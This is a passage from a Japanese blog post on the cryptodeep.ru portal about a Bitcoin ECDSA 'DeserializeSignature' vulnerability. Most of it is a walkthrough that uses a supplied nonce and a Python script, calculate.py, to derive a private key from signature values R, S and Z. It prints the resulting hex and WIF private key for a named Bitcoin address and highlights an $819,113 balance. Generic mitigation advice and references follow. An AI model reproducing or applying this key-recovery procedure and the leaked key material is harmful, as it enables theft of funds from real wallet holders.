<pre class="wp-block-code"><code><strong>!python3 point2gen.py </strong>0x2863763e8ec6bf755cc152e5080e7c74a95295f06cfbe86d9cb7c37f28f1013c</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5249} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-37-1024x288.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5249"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code><strong>(0xb44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307 , 0x3adecc9efffbb36322c8e19071e323815403be263c1e595dc26eb762982b54b0)</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>EC (secp256k1)&nbsp;</code>署名値を使用して点の座標を確認する<code>R</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>R = 0xb44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307
S = 0x74e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f
Z = 0xa79974cb42f82890fcebcb9865cd512a34479d91211e2ce383def10a7388cf63</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>R          =    0xb44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307
point2gen  =   (0xb44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307 , 0x3adecc9efffbb36322c8e19071e323815403be263c1e595dc26eb762982b54b0)
</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>すべて真実です!</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code><strong>K = 0x2863763e8ec6bf755cc152e5080e7c74a95295f06cfbe86d9cb7c37f28f1013c</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>秘密鍵がわかったので、ビットコイン ウォレットの秘密鍵を取得できます。<code><strong><a href="https://btc1.trezor.io/address/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk" target="_blank" rel="noreferrer noopener">1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk</a></strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><em>Python</em>スクリプトを使用してみましょう:&nbsp;<code><a href="https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/calculate.py" target="_blank" rel="noreferrer noopener">calculate.py</a></code>&gt; &gt; &gt; 秘密キーを取得します。</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>コードを開いてすべての署名値を追加しましょう<code><strong>K, R, S, Z</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x2863763e8ec6bf755cc152e5080e7c74a95295f06cfbe86d9cb7c37f28f1013c
R = 0xb44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307
S = 0x74e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f
Z = 0xa79974cb42f82890fcebcb9865cd512a34479d91211e2ce383def10a7388cf63


print (h((((S * K) - Z) * modinv(R,N)) % N))</strong></code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2 class="wp-block-heading">スクリプトは<code><a href="https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/calculate.py" target="_blank" rel="noreferrer noopener">calculate.py</a></code>次の式を使用して秘密キーを計算します。</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>スクリプトを実行してみましょう。</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":5251} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-38.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5251"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code><strong>PrivKey = 0506b0b7b508625dc7b0623db41206c48058ede0a9c75ff265eeb47fea29b3f0</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">ビットアドレス</a></strong>を開いて確認してみましょう:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>ADDR: 1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk
WIF:  5HrVy4SVvC46tsuBhMhVEGHXG4AzhxtEqi4FLbia5vAXuF5GwaX
HEX:  0506b0b7b508625dc7b0623db41206c48058ede0a9c75ff265eeb47fea29b3f0</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5165} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-11.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5165"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://www.blockchain.com/btc/address/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk">https://www.blockchain.com/btc/address/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading"><a href="https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/KEYFOUND.privkey" target="_blank" rel="noreferrer noopener">秘密鍵を受け取りました!</a></h1>
<!-- /wp:heading -->

<!-- wp:image {"id":5255} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-40.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5255"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5256} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-41.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5256"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://www.blockchain.com/explorer/addresses/btc/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk">https://www.blockchain.com/explorer/addresses/btc/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"fontSize":"large"} -->
<p class="has-large-font-size"><code><strong>BALANCE: $ 819113</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">結論</h2>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>この記事では、DeserializeSignature の脆弱性を分析するために使用される主な方法とツールについて説明しました。静的分析と動的分析、および機械学習を使用したファズ テストを使用することで、<code>BitcoinChatGPT</code>ソフトウェアの開発と運用のさまざまな段階で脆弱性を特定し、排除することができます。ビットコインの DeserializeSignature の脆弱性は、ネットワーク セキュリティに深刻な脅威をもたらします。ただし、この分野での積極的な研究開発により、保護レベルを向上させる新たな可能性が開かれます。アルゴリズムの改善、機械学習の使用、セキュリティ標準の開発、および教育プログラムにより、リスクを大幅に軽減し、信頼性の高いシステム運用を保証できます。この調査は、急速に進化する仮想通貨分野におけるセキュリティ システムを継続的に監視し、更新する必要性を浮き彫りにしています。開発者とユーザーに対する推奨事項に従うことは、リスクを大幅に軽減し、潜在的な攻撃から資金を保護するのに役立ちます。セキュリティは継続的なプロセスであり、継続的な注意と最新の知識が必要であることを覚えておくことが重要です。暗号通貨セキュリティ分野における現在および将来の開発は、特定された問題を排除し、新たな脅威を防止することを目的としており、これにより暗号通貨システムのより信頼性の高い安全な運用が保証されます。得られた結果の重要性は、システムの重大な欠点を特定し、それらを除去するための効果的な解決策を提案することにあります。結果を解釈すると、この脆弱性を排除することが、暗号通貨のセキュリティと信頼性を向上させるための重要なステップであることがわかります。 DeserializeSignature プロセスは、ビットコイン トランザクションのセキュリティを確保するために重要です。このプロセスが不適切に実装されると、深刻な脆弱性や攻撃が発生する可能性があります。署名コンポーネントの形式と値を注意深く確認し、信頼できるライブラリを使用し、実行時攻撃の可能性に注意することが重要です。これが、暗号通貨トランザクションを確実に保護する唯一の方法です。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">1. データ検証の改善</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>主な解決策の 1 つは、逆シリアル化中のデータ検証プロセスを改善することです。それには以下が含まれます:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>データ形式のチェック: データを処理する前に、データが予期された形式であることを確認します。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>厳密なデータ型の使用: 逆シリアル化中のエラーを防ぐために厳密なデータ型を使用します。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>データ長チェック: データ長が予想どおりであることを確認します。</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2. 安全なライブラリの使用</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>実績のある安全なデータ逆シリアル化ライブラリを使用すると、脆弱性のリスクを大幅に軽減できます。このようなライブラリは、開発者コミュニティによって徹底的にテストされ、サポートされる必要があります。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">3. 多段階認証の実装</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>マルチレベル認証は、システムへの不正アクセスを防止するのに役立ちます。それには以下が含まれます:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>2 要素認証 (2FA): ユーザーの身元の追加検証を要求します。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>多要素認証 (MFA): 複数の認証方法を使用してセキュリティを向上させます。</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4. 定期的なセキュリティ監査</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>定期的なセキュリティ監査を実施すると、攻撃者に脆弱性が悪用される前に脆弱性を特定して修正できます。それには以下が含まれます:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>侵入テスト: 攻撃をシミュレートしてシステムの弱点を特定します。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>コードのリビジョン: ソース コードを分析して潜在的な脆弱性を検出します。</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">5. アップデートとパッチ適用</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>ソフトウェアを定期的に更新してパッチを適用することは、セキュリティの重要な側面です。それには以下が含まれます:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>ライブラリと依存関係の更新: 使用されるすべてのライブラリと依存関係が最新バージョンに更新されていることを確認します。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>脆弱性パッチ適用: 特定された脆弱性に対する修正を迅速に実装します。</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">参考文献:</h2>
<!-- /wp:heading -->

<!-- wp:list {"ordered":true} -->
<ol><!-- wp:list-item -->
<li><em>アンドレアス M. アントノプロス著「<strong><a href="https://cryptodeep.ru/doc/1-mastering-bitcoin-by-andreas-m-antonopoulos-security-and-vulnerability-review-and-analysis.pdf" target="_blank" rel="noreferrer noopener">Mastering Bitcoin」</a></strong> – これはビットコインに関する最も有名な本の 1 つであり、セキュリティや脆弱性を含む多くの側面をカバーしています。</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeep.ru/doc/2-bitcoin-and-cryptocurrency-technologies.pdf" target="_blank" rel="noreferrer noopener">『ビットコインと暗号通貨のテクノロジー』</a></strong>アルビンド・ナラヤナン、ジョゼフ・ボノー、エドワード・フェルテン、アンドリュー・ミラー、スティーブン・ゴールドフェダー著 – この本は、セキュリティ問題を含め、ビットコインやその他の暗号通貨の基礎となるテクノロジーについて深い理解を提供します。</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeep.ru/doc/3-bitcoin-developer-documentation.pdf" target="_blank" rel="noreferrer noopener">Bitcoin Developer Documentation</a></strong> – ビットコイン開発者向けの公式ドキュメント。Web サイト bitcoin.org で入手できます。これには、さまざまなセキュリティの側面と脆弱性に関する情報が含まれています。</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeep.ru/doc/4-bitcoin-improvement-proposals-bips.pdf" target="_blank" rel="noreferrer noopener">Bitcoin Improvement Proposals (BIP)</a></strong> – ビットコイン プロトコルのさまざまな改善と変更を説明する文書。それらの中には、セキュリティと脆弱性に関連するものもあります。 BIP のリストは bitcoin.org でご覧いただけます。</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeep.ru/doc/5--research-on-anonymity-and-security-of-transactions-in-the-bitcoin-network-a-fistful-of-bitcoins-characterizing-payments-among-men-with-no-names.pdf" target="_blank" rel="noreferrer noopener">「A Fistful of Bitcoins: Characterizing Payments Among Men with No Names」</a> </strong>（サラ・メイクルジョンほか著） – この記事では、ビットコイン ネットワーク上のトランザクションの匿名性とセキュリティについて検討します。</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeep.ru/doc/6-bitcoin-a-peer-to-peer-electronic-cash-system-by-satoshi-nakamoto-original-white-paper-describing-the-concept-of-bitcoin.pdf" target="_blank" rel="noreferrer noopener">「Bitcoin: A Peer-to-Peer Electronic Cash System」サトシ・ナカモト著</a></strong>- ビットコインの概念を説明したオリジナルのホワイトペーパー。脆弱性に焦点を当てたものではありませんが、システムを理解するための基本的な文書です。</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeep.ru/doc/7-security-and-privacy-in-the-bitcoin-network-research-by-malte-moser.pdf" target="_blank" rel="noreferrer noopener">「Security and Privacy in Bitcoin」Malte Möser 著</a></strong>– ビットコイン ネットワークにおけるセキュリティとプライバシーのさまざまな側面を調査した論文。</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeep.ru/doc/8-security-issues-in-bitcoin-and-blockchain-technologies-dissertation-by-ghassan-o-karame.pdf" target="_blank" rel="noreferrer noopener">「ビットコインとブロックチェーンのセキュリティ」Ghassan O. Karame 著</a></strong>– ビットコインとブロックチェーン技術のセキュリティ問題に関する論文。</em></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://dzen.ru/embed/vqOZbDlW4tBs?from_block=partner&amp;from=zen&amp;mute=0&amp;autoplay=0&amp;tv=0">https://dzen.ru/embed/vqOZbDlW4tBs?from_block=partner&amp;from=zen&amp;mute=0&amp;autoplay=0&amp;tv=0</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>この資料は、&nbsp;暗号通貨<a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">BITCOIN</a>&nbsp;の&nbsp;&nbsp;弱い&nbsp;<a href="https://github.com/demining/CryptoDeepTools" target="_blank" rel="noreferrer noopener">ECDSA</a>署名に対する&nbsp;データおよび楕円曲線暗号&nbsp;<a href="https://www.youtube.com/@cryptodeeptech" target="_blank" rel="noreferrer noopener">secp256k1の財務的セキュリティを確保するために、&nbsp;</a><a href="https://cryptodeep.ru/" target="_blank" rel="noreferrer noopener">CRYPTO DEEP TECH</a>ポータル用に作成されました。ソフトウェアの作成者は素材の使用について責任を負いません。<a href="https://www.youtube.com/@cryptodeeptech" target="_blank" rel="noreferrer noopener"></a><a href="https://github.com/demining/CryptoDeepTools" target="_blank" rel="noreferrer noopener"></a><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener"></a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/32DeserializeSignatureVulnerability" target="_blank" rel="noreferrer noopener">ソース</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://colab.research.google.com/drive/1EiIIJh8UCOZZ8DVbelxhESFPvqu_xZUo" target="_blank" rel="noreferrer noopener">Googleコラボ</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://attacksafe.ru/ultra" target="_blank" rel="noreferrer noopener">アタックセーフ ウルトラ</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">電報: https://t.me/cryptodeeptech</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://youtu.be/8E2KJeWu4XA" target="_blank" rel="noreferrer noopener">動画素材：https://youtu.be/8E2KJeWu4XA</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://dzen.ru/video/watch/664e34fc8df6514b10da09e9" target="_blank" rel="noreferrer noopener">Dzen ビデオチュートリアル: https://dzen.ru/video/watch/664e34fc8df6514b10da09e9</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/deserialize-signature-vulnerability-bitcoin" target="_blank" rel="noreferrer noopener">出典: https://cryptodeep.ru/deserialize-signature-vulnerability-bitcoin</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":5187} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/053-1-1024x576.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5187"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>&nbsp;<a href="https://cryptodeep.ru/category/%d0%ba%d1%80%d0%b8%d0%bf%d1%82%d0%be%d0%b0%d0%bd%d0%b0%d0%bb%d0%b8%d0%b7/">暗号解析</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->
